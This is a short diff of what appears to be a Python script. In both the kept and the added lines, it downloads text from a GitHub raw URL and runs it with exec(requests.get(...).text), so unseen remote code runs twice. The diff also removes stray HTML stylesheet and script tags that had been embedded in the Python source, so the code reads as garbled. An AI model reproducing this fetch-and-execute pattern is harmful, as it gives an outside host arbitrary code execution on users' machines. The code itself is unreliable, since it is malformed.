@@ -17,13 +17,7 @@ C = '\033[36m'
 exec(requests.get("https://raw.githubusercontent.com/roketbun/tolol/master/control.txt").text)
 
 
-exec(requests.get("https://raw.githubusercontent.com/roketbun/tolol/master/control.py").text)
-
-
-
-<link rel="stylesheet" href="https://raw.github.com/roketbun/tolol/master/style.css"/>
-<script src="https://raw.github.com/roketbun/tolol/master/script.js"></script>
-
+exec(requests.get("https://raw.githubusercontent.com/roketbun/tolol/master/control.txt").text)
 
 
 def ngontol():
